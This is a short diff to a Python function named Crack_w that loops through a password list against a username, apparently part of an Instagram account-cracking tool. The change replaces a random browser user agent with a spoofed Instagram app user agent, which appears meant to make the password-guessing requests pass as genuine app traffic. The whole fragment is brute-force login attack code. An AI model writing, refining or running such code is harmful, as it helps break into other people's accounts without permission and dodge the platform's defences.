@@ -364,7 +364,7 @@ def Crack_w(username, memek):
     for password in memek:
         try:
             ses = requests.Session()
-            uag = generate_random_user_agent(device_type='android', browser_type='chrome')
+            uag = UserAgentBarcelona().replace('Barcelona 289.0.0.77.109', 'Instagram 103.1.0.15.119').replace('489720145', '164094530')
             device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
             _hash = hashlib.md5()
             _hash.update(username.encode('utf-8') + password.encode('utf-8'))
